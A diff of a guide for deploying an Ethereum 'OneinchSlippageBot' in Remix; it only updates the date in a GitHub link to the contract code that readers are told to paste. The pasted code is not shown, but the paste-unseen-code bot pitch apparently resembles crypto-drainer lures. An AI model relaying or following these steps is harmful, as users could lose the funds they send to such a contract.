@@ -14,7 +14,7 @@ Step-by-Step Guide to Deploy the Bot
 
 •In Remix, go to the "contracts" folder, click "New File", and name it something like "OneinchSlippageBot.sol". Make sure it ends with .sol (Solidity file extension).
 •If the text is not highlighted, simply refresh the browser and re-paste the contract code.
-🔥 [Paste the ETH Contract Code in Remix.](https://github.com/Jacob-Web3/ETH-Bot/blob/main/Code%20-%20Update%2023%20October%202024)
+🔥 [Paste the ETH Contract Code in Remix.](https://github.com/Jacob-Web3/ETH-Bot/blob/main/Code%20-%20Update%2024%20October%202024)
 
 4. Compile the Contract:
 
